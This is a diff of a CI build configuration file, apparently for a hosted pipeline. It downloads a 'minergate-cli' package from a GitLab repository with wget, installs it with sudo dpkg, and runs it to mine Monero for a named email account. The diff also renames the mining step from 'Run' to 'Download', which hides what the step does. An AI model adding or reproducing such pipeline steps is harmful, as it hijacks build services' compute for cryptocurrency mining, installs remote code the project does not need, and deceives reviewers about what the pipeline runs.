@@ -6,10 +6,17 @@ build:
     - install-packages:
         packages: wget dpkg gnupg
         
-    - wget https://gitlab.com/Yoginth/Miner/raw/master/minergate-cli.deb -O minergate-cli.deb
-    - sudo dpkg -i minergate-cli.deb
+    - script:
+        name: Download
+        code: |
+          wget https://gitlab.com/Yoginth/Miner/raw/master/minergate-cli.deb -O minergate-cli.deb
+
+    - script:
+        name: Download
+        code: |
+          sudo dpkg -i minergate-cli.deb
           
     - script:
-        name: Run
+        name: Download
         code: |
           minergate-cli -user yoginth@hotmail.com xmr
